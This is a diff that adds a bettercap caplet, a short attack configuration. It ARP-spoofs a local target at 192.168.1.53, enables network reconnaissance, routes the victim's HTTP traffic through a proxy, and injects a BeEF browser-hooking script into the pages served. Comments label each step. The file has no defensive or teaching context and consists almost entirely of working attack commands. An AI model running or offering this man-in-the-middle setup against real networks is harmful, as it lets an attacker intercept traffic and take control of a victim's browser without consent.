@@ -1,0 +1,17 @@
+set arp.spoof.targets 192.168.1.53
+# inject beef hook
+set http.proxy.script caplets/beef-inject.js
+# keep reading arp table for network mapping
+net.recon on
+# redirect http traffic to a proxy
+http.proxy on
+# wait for everything to start properly
+sleep 1
+
+arp.spoof on
+
+
+
+
+
+
